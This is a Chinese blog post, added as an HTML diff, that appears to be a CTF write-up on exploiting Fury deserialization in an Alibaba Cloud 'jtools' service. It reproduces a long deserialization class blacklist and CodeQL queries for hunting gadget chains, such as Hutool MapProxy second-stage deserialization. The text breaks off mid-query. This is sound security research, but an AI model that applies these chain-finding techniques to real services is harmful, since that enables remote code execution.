@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      阿里云jtools详解及codeql分析调用链 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">阿里云jtools详解及codeql分析调用链</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-06-29 01:36:26
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>拖了将近四个月的坑，现在填一下。</p>
+<h3 id="起手式"><a href="#起手式" class="headerlink" title="起手式"></a>起手式</h3><p>反编译看源码，起了一个http，接受参数就是一个很直接的fury反序列化，会直接调用toString，存在黑名单</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750737680966-db326f4e-b388-4771-bf19-37851e0b633a.png"></p>
+<p><a target="_blank" rel="noopener" href="https://fory.apache.org/zh-CN/docs/docs/guide/java_object_graph_guide">https://fory.apache.org/zh-CN/docs/docs/guide/java_object_graph_guide</a> </p>
+<p>fury文档</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750745201285-c3d5b199-806f-4b02-a5c9-b69bbfef007f.png"></p>
+<p>关闭了需要注册才能反序列化的配置，看一眼黑名单</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">bsh.Interpreter
+bsh.XThis
+ch.qos.logback.core.db.DriverManagerConnectionSource
+ch.qos.logback.core.db.JNDIConnectionSource
+clojure.core
+clojure.main
+com.caucho.config.types.ResourceRef
+com.caucho.hessian.test.TestCons
+com.caucho.naming.QName
+com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.Base64Data
+com.ibm.xltxe.rnm1.xtq.bcel.util.ClassLoader
+com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase
+com.mchange.v2.c3p0.JndiRefForwardingDataSource
+com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
+com.mysql.cj.jdbc.MysqlConnectionPoolDataSource
+com.mysql.cj.jdbc.MysqlDataSource
+com.mysql.cj.jdbc.MysqlXADataSource
+com.mysql.jdbc.jdbc2.optional.MysqlDataSource
+com.mysql.jdbc.util.ServerController
+com.rometools.rome.feed.impl.EqualsBean
+com.rometools.rome.feed.impl.ToStringBean
+com.sun.corba.se.impl.activation.ServerManagerImpl
+com.sun.corba.se.impl.activation.ServerTableEntry
+com.sun.corba.se.impl.presentation.rmi.InvocationHandlerFactoryImpl.CustomCompositeInvocationHandlerImpl
+com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl
+com.sun.corba.se.spi.orbutil.proxy.LinkedInvocationHandler
+com.sun.jndi.ldap.LdapAttribute
+com.sun.jndi.rmi.registry.BindingEnumeration
+com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl
+com.sun.org.apache.bcel.internal.util.ClassLoader
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+com.sun.org.apache.xpath.internal.objects.XString
+com.sun.org.apache.xpath.internal.XPathContext
+com.sun.rowset.JdbcRowSetImpl
+com.sun.syndication.feed.impl.EqualsBean
+com.sun.syndication.feed.impl.ObjectBean
+com.sun.syndication.feed.impl.ToStringBean
+com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data
+com.zaxxer.hikari.HikariConfig
+com.zaxxer.hikari.HikariDataSource
+groovy.lang.PropertyValue
+groovy.util.MapEntry
+java.beans.EventHandler
+java.beans.Expression
+java.lang.invoke.InvokeDynamic
+java.lang.invoke.MethodHandles.Lookup
+java.lang.MethodHandle
+java.lang.Process
+java.lang.ProcessBuilder
+java.lang.reflect.Constructor
+java.lang.reflect.Field
+java.lang.reflect.Method
+java.lang.Runtime
+java.lang.Shutdown
+java.lang.System
+java.lang.Thread
+java.lang.ThreadGroup
+java.lang.ThreadLocal
+java.lang.UNIXProcess
+java.lang.VarHandler
+java.net.Socket
+java.rmi.registry.Registry
+java.rmi.server.ObjID
+java.rmi.server.RemoteObjectInvocationHandler
+java.rmi.server.UnicastRemoteObject
+java.security.SignedObject
+java.util.ServiceLoader
+javassist.bytecode.annotation.Annotation
+javassist.bytecode.annotation.AnnotationImpl
+javassist.bytecode.annotation.AnnotationMemberValue
+javassist.tools.web.Viewer
+javassist.util.proxy.SerializedProxy
+javax.activation.MimeTypeParameterList
+javax.imageio.ImageIO
+javax.imageio.spi.ServiceRegistry
+javax.management.BadAttributeValueExpException
+javax.management.ImmutableDescriptor
+javax.management.MBeanServerInvocationHandler
+javax.management.openmbean.CompositeDataInvocationHandler
+javax.media.jai.remote.SerializableRenderedImage
+javax.naming.InitialContext
+javax.naming.ldap.Rdn
+javax.naming.spi.ContinuationContext.getEnvironment
+javax.naming.spi.ContinuationContext.getTargetContext
+javax.naming.spi.ObjectFactory
+javax.script.ScriptEngineManager
+javax.sound.sampled.AudioFileFormat
+javax.sound.sampled.AudioFormat
+javax.swing.UIDefaults
+javax.xml.transform.Templates
+net.bytebuddy.dynamic.loading.ByteArrayClassLoader
+oracle.jdbc.connector.OracleManagedConnectionFactory
+oracle.jdbc.pool.OracleDataSource
+org.apache.activemq.ActiveMQConnectionFactory
+org.apache.activemq.ActiveMQXAConnectionFactory
+org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory
+org.apache.bcel.util.ClassLoader
+org.apache.carbondata.core.scan.expression.ExpressionResult
+org.apache.commons.beanutils.BeanComparator
+org.apache.commons.beanutils.BeanToPropertyValueTransformer
+org.apache.commons.codec.binary.Base64
+org.apache.commons.collections.functors.ChainedTransformer
+org.apache.commons.collections.functors.ConstantTransformer
+org.apache.commons.collections.functors.InstantiateTransformer
+org.apache.commons.collections.functors.InvokerTransformer
+org.apache.commons.collections.Transformer
+org.apache.commons.collections4.comparators.TransformingComparator
+org.apache.commons.collections4.functors.ChainedTransformer
+org.apache.commons.collections4.functors.ConstantTransformer
+org.apache.commons.collections4.functors.InstantiateTransformer
+org.apache.commons.collections4.functors.InvokerTransformer
+org.apache.commons.configuration.JNDIConfiguration
+org.apache.commons.configuration2.JNDIConfiguration
+org.apache.commons.dbcp.datasources.PerUserPoolDataSource
+org.apache.commons.dbcp.datasources.SharedPoolDataSource
+org.apache.commons.dbcp2.datasources.PerUserPoolDataSource
+org.apache.commons.dbcp2.datasources.SharedPoolDataSource
+org.apache.commons.fileupload.disk.DiskFileItem
+org.apache.ibatis.executor.loader.AbstractSerialStateHolder
+org.apache.ibatis.executor.loader.cglib.CglibProxyFactory
+org.apache.ibatis.executor.loader.CglibSerialStateHolder
+org.apache.ibatis.executor.loader.javassist.JavassistSerialStateHolder
+org.apache.ibatis.executor.loader.JavassistSerialStateHolder
+org.apache.ibatis.javassist.bytecode.annotation.Annotation
+org.apache.ibatis.javassist.bytecode.annotation.AnnotationImpl
+org.apache.ibatis.javassist.bytecode.annotation.AnnotationMemberValue
+org.apache.ibatis.javassist.tools.web.Viewer
+org.apache.ibatis.javassist.util.proxy.SerializedProxy
+org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup
+org.apache.log.output.db.DefaultDataSource
+org.apache.log4j.receivers.db.DriverManagerConnectionSource
+org.apache.myfaces.context.servlet.FacesContextImpl
+org.apache.myfaces.context.servlet.FacesContextImplBase
+org.apache.myfaces.el.CompositeELResolver
+org.apache.myfaces.el.unified.FacesELContext
+org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression
+org.apache.openjpa.ee.JNDIManagedRuntime
+org.apache.openjpa.ee.RegistryManagedRuntime
+org.apache.shiro.jndi.JndiObjectFactory
+org.apache.shiro.realm.jndi.JndiRealmFactory
+org.apache.tomcat.dbcp.dbcp.BasicDataSource
+org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource
+org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource
+org.apache.tomcat.dbcp.dbcp2.BasicDataSource
+org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource
+org.apache.velocity.runtime.resource.ContentResource
+org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader
+org.apache.velocity.runtime.resource.Resource
+org.apache.velocity.Template
+org.apache.wicket.util.upload.DiskFileItem
+org.apache.xalan.xsltc.trax.TemplatesImpl
+org.apache.xbean.naming.context.ContextUtil
+org.apache.xpath.XPathContext
+org.apache.zookeeper.Shell
+org.aspectj.apache.bcel.util.ClassLoader
+org.bouncycastle.asn1.ASN1Object
+org.bouncycastle.asn1.x509.X509Extensions
+org.codehaus.groovy.runtime.ConvertedClosure
+org.codehaus.groovy.runtime.GStringImpl
+org.codehaus.groovy.runtime.MethodClosure
+org.datanucleus.store.rdbms.datasource.dbcp.datasources.PerUserPoolDataSource;
+org.datanucleus.store.rdbms.datasource.dbcp.datasources.SharedPoolDataSource;
+org.eclipse.jetty.util.log.LoggerLog
+org.geotools.filter.ConstantExpression
+org.h2.value.ValueJavaObject
+org.h2.message.Trace
+org.h2.message.TraceObject
+org.h2.message.TraceSystem
+org.h2.message.TraceWriterAdapter
+org.h2.jdbcx.JdbcDataSource
+org.hibernate.engine.spi.TypedValue
+org.hibernate.tuple.component.AbstractComponentTuplizer
+org.hibernate.tuple.component.PojoComponentTuplizer
+org.hibernate.type.AbstractType
+org.hibernate.type.ComponentType
+org.hibernate.type.Type
+org.jboss.ejb3.proxy.handle.HomeHandleImpl
+org.jboss.ejb3.stateful.StatefulHandleImpl
+org.jboss.ejb3.stateless.StatelessHandleImpl
+org.jboss.interceptor.builder.InterceptionModelBuilder
+org.jboss.interceptor.builder.MethodReference
+org.jboss.interceptor.proxy.DefaultInvocationContextFactory
+org.jboss.interceptor.proxy.InterceptorMethodHandler
+org.jboss.interceptor.reader.ClassMetadataInterceptorReference
+org.jboss.interceptor.reader.DefaultMethodMetadata
+org.jboss.interceptor.reader.ReflectiveClassMetadata
+org.jboss.interceptor.reader.SimpleInterceptorMetadata
+org.jboss.interceptor.spi.instance.InterceptorInstantiator
+org.jboss.interceptor.spi.metadata.InterceptorReference
+org.jboss.interceptor.spi.metadata.MethodMetadata
+org.jboss.interceptor.spi.model.InterceptionModel
+org.jboss.interceptor.spi.model.InterceptionType
+org.jboss.proxy.ejb.handle.EntityHandleImpl
+org.jboss.proxy.ejb.handle.HomeHandleImpl
+org.jboss.proxy.ejb.handle.StatefulHandleImpl
+org.jboss.proxy.ejb.handle.StatelessHandleImpl
+org.jboss.resteasy.plugins.server.resourcefactory.JndiResourceFactory
+org.jboss.weld.interceptor.builder.InterceptionModelBuilder
+org.jboss.weld.interceptor.builder.MethodReference
+org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory
+org.jboss.weld.interceptor.proxy.InterceptorMethodHandler
+org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference
+org.jboss.weld.interceptor.reader.DefaultMethodMetadata
+org.jboss.weld.interceptor.reader.ReflectiveClassMetadata
+org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata
+org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator
+org.jboss.weld.interceptor.spi.metadata.InterceptorReference
+org.jboss.weld.interceptor.spi.metadata.MethodMetadata
+org.jboss.weld.interceptor.spi.model.InterceptionModel
+org.jboss.weld.interceptor.spi.model.InterceptionType
+org.mockito.internal.creation.cglib.AcrossJVMSerializationFeature
+org.mortbay.log.Slf4jLog
+org.mozilla.javascript.Context
+org.mozilla.javascript.IdScriptableObject
+org.mozilla.javascript.MemberBox
+org.mozilla.javascript.NativeError
+org.mozilla.javascript.NativeJavaMethod
+org.mozilla.javascript.NativeJavaObject
+org.mozilla.javascript.NativeObject
+org.mozilla.javascript.ScriptableObject
+org.python.core.PyBytecode
+org.python.core.PyFunction
+org.python.core.PyObject
+org.quartz.utils.JNDIConnectionProvider
+org.reflections.Reflections
+org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator
+org.springframework.aop.framework.AdvisedSupport
+org.springframework.aop.framework.JdkDynamicAopProxy
+org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+org.springframework.aop.target.SingletonTargetSource
+org.springframework.beans.BeanWrapperImpl
+org.springframework.beans.factory.BeanFactory
+org.springframework.beans.factory.config.MethodInvokingFactoryBean
+org.springframework.beans.factory.config.PropertyPathFactoryBean
+org.springframework.beans.factory.ObjectFactory
+org.springframework.beans.factory.support.DefaultListableBeanFactory
+org.springframework.core.SerializableTypeWrapper
+org.springframework.expression.spel.ast.Indexer
+org.springframework.expression.spel.ast.MethodReference
+org.springframework.jndi.JndiObjectTargetSource
+org.springframework.jndi.support.SimpleJndiBeanFactory
+org.springframework.orm.jpa.AbstractEntityManagerFactoryBean
+org.springframework.transaction.jta.JtaTransactionManager
+org.thymeleaf.standard.expression.Expression
+org.thymeleaf.standard.expression.StandardExpressionParser
+org.yaml.snakeyaml.tokens.DirectiveToken
+pstore.shaded.org.apache.commons.collections.functors.InvokerTransformer
+sun.print
+sun.print.UnixPrintService
+sun.print.UnixPrintServiceLookup
+sun.rmi.server.UnicastRef
+sun.rmi.server.UnicastRef2
+sun.rmi.transport.LiveRef
+sun.rmi.transport.tcp.TCPEndpoint
+sun.swing.SwingLazyValue
+weblogic.ejb20.internal.LocalHomeHandleImpl
+weblogic.jms.common.ObjectMessageImpl
+com.atomikos.icatch.jta.RemoteClientUserTransaction
+com.feilong.lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>分析下带的依赖及不在黑名单的利用链</p>
+<p><a target="_blank" rel="noopener" href="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/">https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/</a>  hutool自带的getter触发，利用苛刻</p>
+<p>AbstractAction  –&gt; equals</p>
+<p>PriorityQueue –&gt; compare</p>
+<p>很有意思的是feilong中存在一个PropertyComparator，也是和cb的一模一样，可以用于触发getter</p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750747755247-50c41f7c-fdf8-4b72-a831-c21c71600993.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750747766154-5b667e36-1388-4cf0-89a0-b6353233e5ee.png"></p>
+<h3 id="利用链查找"><a href="#利用链查找" class="headerlink" title="利用链查找"></a>利用链查找</h3><h4 id="feilong-任意类构造函数调用"><a href="#feilong-任意类构造函数调用" class="headerlink" title="feilong 任意类构造函数调用"></a>feilong 任意类构造函数调用</h4><p>构建codeql库，写个通用规则找一些sink点，查找一些getter和toString触发的起点链</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">/**
+@kind path-problem
+*/
+
+import java
+import semmle.code.java.dataflow.FlowSources
+
+class Serializable extends Method&#123;
+    Serializable()&#123;
+        this.getDeclaringType().getASupertype*() instanceof TypeSerializable
+    &#125;
+&#125;
+
+class GetSource extends Serializable &#123;
+    GetSource()&#123;
+    ((this.getName().indexOf("get") = 0 or this.getName().indexOf("set") = 0) and
+    this.hasNoParameters() and
+    this.getName().length() > 3 and
+    this.isPublic() )
+    or this.hasName("toString")
+    
+
+&#125;
+&#125;
+
+class GetSink extends Serializable &#123;
+
+    GetSink() &#123;
+        exists(MethodCall a| 
+            (
+            (a.getCallee().hasName("lookup") and a.getCallee().getDeclaringType().getASupertype*().hasQualifiedName("javax.naming", "Context"))
+        or   a.getCallee().hasName("readObject")
+        or   (a.getCallee().hasName("newInstance") and a.getCallee().getNumberOfParameters() = 1 )
+            )
+        and  this = a.getCaller()
+            ) 
+    &#125;  
+&#125;  
+
+query predicate edges(Method a, Method b) &#123; 
+    a.polyCalls(b)
+&#125;
+
+from GetSource source, GetSink sink
+where edges+(source, sink)
+select source, source, sink, "$@ $@ to $@ $@" ,
+source.getDeclaringType(),source.getDeclaringType().getName(),
+source,source.getName(),
+sink.getDeclaringType(),sink.getDeclaringType().getName(),
+sink,sink.getName()     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>几乎所有都指向一个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750747160268-e59d71b1-896e-4802-9aaa-34e90c617d1c.png"></p>
+<p>此类类似于cc3的触发，可以去打TrAXFilter constructor newInstance，可惜在黑名单了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750747886132-80fb6011-b3e2-4f3f-93a1-4ee079fc3a90.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750747250989-d7b189e2-ffeb-4b9e-9fec-d4df95f3a632.png"></p>
+<h4 id="Hutool-mapproxy二次反序列化（正解）"><a href="#Hutool-mapproxy二次反序列化（正解）" class="headerlink" title="Hutool mapproxy二次反序列化（正解）"></a>Hutool mapproxy二次反序列化（正解）</h4><p>翻阅了一下fury的文档，没有继承反序列化接口的也可以去参与反序列化，所以重新编写规则，只查找sink点</p>
+<ul>
+<li>排除feilong黑名单</li>
+<li>因为不知道jdk版本，外加没有tomcat依赖，抛弃jndi sink点</li>
+</ul>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
+@kind path-problem
+*/</span>
+<span class="token keyword">import</span> <span class="token namespace">java</span>
+<span class="token keyword">import</span> <span class="token namespace">semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span></span><span class="token class-name">FlowSources</span>
+
+<span class="token keyword">class</span> <span class="token class-name">GetSink</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">GetSink</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">MethodCall</span> a<span class="token operator">|</span> 
+            <span class="token punctuation">(</span>
+             a<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"readObject"</span><span class="token punctuation">)</span>
+        or   <span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">)</span> and a<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getNumberOfParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span>
+        and  <span class="token keyword">this</span> <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getCaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token punctuation">)</span> 
+        and not <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getQualifiedName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"com.feilong.lib%"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+from <span class="token class-name">GetSink</span> sink
+select sink<span class="token punctuation">,</span>sink<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750748586560-4a83a2ab-652f-4118-87f0-da4dab69c387.png"></p>
+<p>sink点筛选一下，大概只有这两个是可利用性比较高的</p>
+<ul>
+<li>ReflectUtil newInstance 任意类构造函数调用</li>
+<li>IoUtil readObj 二次反序列化</li>
+</ul>
+<p>接下来编写数据流分析，确保我们的参数可以一直到sink点调用</p>
+<p>source</p>
+<ul>
+<li>toString触发点</li>
+<li>readObject触发点</li>
+<li>invoke触发点</li>
+</ul>
+<p>但是实际上如果三个规则一起写就会因为数据量太大数据流图构建不出来。所以就面向答案解题，直接查找invoke的触发点，需要编写一个污点传播规则</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
+@kind path-problem
+*/</span>
+<span class="token keyword">import</span> <span class="token namespace">java</span>
+<span class="token keyword">import</span> <span class="token namespace">semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span></span><span class="token class-name">FlowSources</span>
+
+
+<span class="token keyword">module</span> <span class="token class-name">InvokeToDeserializeFlowConfig</span> <span class="token keyword">implements</span> <span class="token class-name">DataFlow</span><span class="token operator">::</span><span class="token class-name">ConfigSig</span> <span class="token punctuation">&#123;</span>
+    predicate <span class="token function">isSource</span><span class="token punctuation">(</span><span class="token class-name">DataFlow</span><span class="token operator">::</span><span class="token class-name">Node</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">|</span>
+            <span class="token comment">// MapProxy的invoke方法的参数</span>
+            <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"invoke"</span> and
+             source<span class="token punctuation">.</span><span class="token function">asParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getAParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+             and m<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token class-name">RefType</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.lang.reflect"</span><span class="token punctuation">,</span> <span class="token string">"InvocationHandler"</span><span class="token punctuation">)</span>
+             <span class="token punctuation">)</span> 
+        <span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// Sink: 反序列化方法调用</span>
+    predicate <span class="token function">isSink</span><span class="token punctuation">(</span><span class="token class-name">DataFlow</span><span class="token operator">::</span><span class="token class-name">Node</span> sink<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">exists</span><span class="token punctuation">(</span><span class="token class-name">MethodCall</span> mc <span class="token operator">|</span>
+            sink<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> mc<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
+            <span class="token punctuation">(</span>
+                <span class="token punctuation">(</span>mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"cn.hutool.core.io"</span><span class="token punctuation">,</span> <span class="token string">"IoUtil"</span><span class="token punctuation">)</span> and mc<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"readObj"</span><span class="token punctuation">)</span> 
+                or
